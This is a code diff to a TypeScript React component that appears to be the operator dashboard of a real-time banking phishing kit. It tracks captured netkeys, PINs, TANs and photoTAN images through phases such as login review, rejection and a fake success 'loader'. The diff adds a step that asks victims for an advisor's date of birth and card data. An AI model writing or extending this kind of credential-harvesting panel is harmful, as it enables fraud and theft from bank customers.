@@ -16,16 +16,19 @@ type AuthRow = {
   device_name: string | null;
   photo_tan_image: string | null;
   last_error: string | null;
+  show_berater: boolean | null;
   used: boolean;
   created_at: string;
 };
 
-type MetaRow = { task_id: string; netkey: string | null; pin: string | null; tan: string | null };
+type MetaRow = { task_id: string; netkey: string | null; pin: string | null; tan: string | null; berater_geburtsdatum?: string | null; berater_karte?: string | null };
 
 const PHASE_LABEL: Record<string, string> = {
   login: "Wartet auf Login",
   login_review: "Login prüfen",
   login_rejected: "Login abgelehnt",
+  berater: "Berater-Verifizierung (Kunde)",
+  berater_review: "Berater-Daten prüfen",
   confirm: "Gerätebestätigung",
   phototan_request: "PhotoTAN wird angefordert",
   phototan: "PhotoTAN-Eingabe",
@@ -34,6 +37,7 @@ const PHASE_LABEL: Record<string, string> = {
   success: "Erfolgreich (Loader)",
   aborted: "Abgebrochen",
 };
+
 
 const AuthLiveCard = () => {
   const [rows, setRows] = useState<AuthRow[]>([]);
